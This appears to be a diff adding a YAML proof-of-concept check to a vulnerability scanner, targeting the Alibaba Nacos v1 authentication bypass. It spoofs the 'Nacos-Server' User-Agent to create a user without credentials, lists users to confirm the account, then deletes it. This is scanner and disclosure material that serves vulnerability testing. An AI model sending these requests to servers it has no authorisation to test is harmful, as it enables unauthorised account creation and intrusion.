@@ -1,0 +1,27 @@
+name: poc-yaml-alibaba-nacos-v1-auth-bypass
+set:
+  r1: randomLowercase(16)
+  r2: randomLowercase(16)
+rules:
+  - method: POST
+    path: "/nacos/v1/auth/users?username={{r1}}&password={{r2}}"
+    headers:
+      User-Agent: Nacos-Server
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("create user ok!"))
+  - method: GET
+    path: "/nacos/v1/auth/users?pageNo=1&pageSize=999"
+    headers:
+      User-Agent: Nacos-Server
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(r1))
+  - method: DELETE
+    path: "/nacos/v1/auth/users?username={{r1}}"
+    headers:
+      User-Agent: Nacos-Server
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("delete user ok!"))
+detail:
+  author: kmahyyg(https://github.com/kmahyyg)
+  links:
+    - https://github.com/alibaba/nacos/issues/4593
